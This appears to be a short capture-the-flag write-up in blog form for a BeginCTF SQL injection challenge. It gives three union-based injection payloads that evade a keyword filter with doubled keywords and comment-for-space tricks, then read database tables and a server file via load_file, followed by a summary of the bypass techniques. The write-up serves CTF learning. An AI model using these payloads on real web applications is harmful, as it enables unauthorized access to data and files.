---
title: BeginCTF-SQL教学局
category: CTF-Web-SQL
date: 2024-2-3
---

> source:[BeginCTF]SQL教学局

## info

![img](https://x1lys.github.io/X1lyS.blog.github.io/src/assets/img/7-1-1.png)

## EXP

```cpp
?user=1'/**/union/**/seselectlect/**/flag/**/frofromm/**/secret.passwoorrd%23
```

![img](https://x1lys.github.io/X1lyS.blog.github.io/src/assets/img/7-1-2.png)

```cpp
?user=1'/**/union/**/seselectlect/**/grade/**/frofromm/**/scoorre/**/where/**/student/**/like/**/'begin'%23
```

![img](https://x1lys.github.io/X1lyS.blog.github.io/src/assets/img/7-1-3.png)

```cpp
?user=1'/**/union/**/seleselectct/**/loaloadd_file('/flag')%23
```

![img](https://x1lys.github.io/X1lyS.blog.github.io/src/assets/img/7-1-4.png)

## Summary

```cpp
类型：
联合查询注入

注释：
%23

空格过滤绕过：
/**/

关键字'or','from','select','load'过滤绕过：
双写关键字

and过滤绕过：
like

文件读取函数：
load_file('/path')
```

